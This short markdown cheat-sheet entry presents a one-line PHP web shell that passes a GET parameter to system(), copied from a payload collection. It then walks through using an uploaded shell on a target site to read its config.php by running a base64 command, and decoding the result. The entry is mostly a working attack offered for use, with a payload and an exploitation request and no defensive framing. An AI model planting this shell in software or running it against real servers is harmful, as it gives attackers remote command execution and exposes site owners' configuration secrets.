# PHP Web Shell

[swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/shell.php)

```
<?php 
echo "Shell";system($_GET['cmd']); 
?>
```

## Retrieving PHP file contents via a *PHP web shell* interface.

[Reading PHP Source Code Through A Browser](https://medium.com/@cybertest72/reading-php-source-code-through-a-browser-e08a392d22fc)

```
base64 < ..$u
```

*s.php file is PHP Web Shell*

https://vulnerable.site/uploads/s.php?cmd=base64%20%3C%20..$u/config.php

Above request is reading *config.php* from the *vulnerable.site*.

Response will be getting "encoded Base64 format data".

![image](https://github.com/user-attachments/assets/62041500-35d8-458a-a780-0e61a485df97)

Then, it can be decoded using base64 decoder such as [Base64 Decode and Encode - Online](https://www.base64decode.org/).

![image](https://github.com/user-attachments/assets/b2388a42-4881-4a11-8c5a-3b05a76c6293)
